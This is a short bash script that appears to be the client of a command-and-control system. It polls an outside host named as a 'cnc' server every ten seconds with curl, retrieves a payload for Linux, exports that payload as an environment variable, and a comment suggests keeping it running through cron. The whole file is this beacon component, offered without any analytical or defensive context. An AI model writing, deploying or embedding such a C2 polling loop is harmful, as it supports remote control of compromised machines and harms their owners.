#!/bin/bash
#CONSTANTS
#NOTE: use cron
while true
do
    SERVER="https://cnc-c9-nicbit.c9.io"
    OLD_PAYLOAD="$PAYLOAD"
    NEW_PAYLOAD=`curl -s $SERVER/linux`
    if [ "$NEW_PAYLOAD" != "$OLD_PAYLOAD" ]
    then
        PAYLOAD=$NEW_PAYLOAD
        export PAYLOAD
    fi
    sleep 10;
done